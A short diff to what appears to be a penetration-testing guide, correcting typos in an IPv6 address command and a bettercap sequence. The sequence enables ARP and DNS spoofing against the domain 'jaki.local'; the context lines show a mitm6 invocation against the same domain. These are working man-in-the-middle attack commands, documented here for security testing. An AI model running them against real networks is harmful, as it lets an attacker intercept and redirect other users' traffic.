@@ -37,7 +37,7 @@ python mitm6.py -d jaki.local
 or you can try assigning IPv6 addresses yourself:
 
 ```
-ifconfig eth0 inet6 add fe80:: 200:f 8ff:fe21:67cf/64 
+ifconfig eth0 inet6 add fe80::200:f8ff:fe21:67cf/64 
 ```
 
 You can end up using an **ARP & DNS attack Spoof**, which will always work if there is user traffic in the vlan:
@@ -45,7 +45,7 @@ You can end up using an **ARP & DNS attack Spoof**, which will always work if th
 ```
 ./bettercap-iface eth0
 net.probe on
-set dns.spoof .domains jaki.local
+set dns.spoof.domains jaki.local
 dns.spoof on
 arp.spoof on
 ```
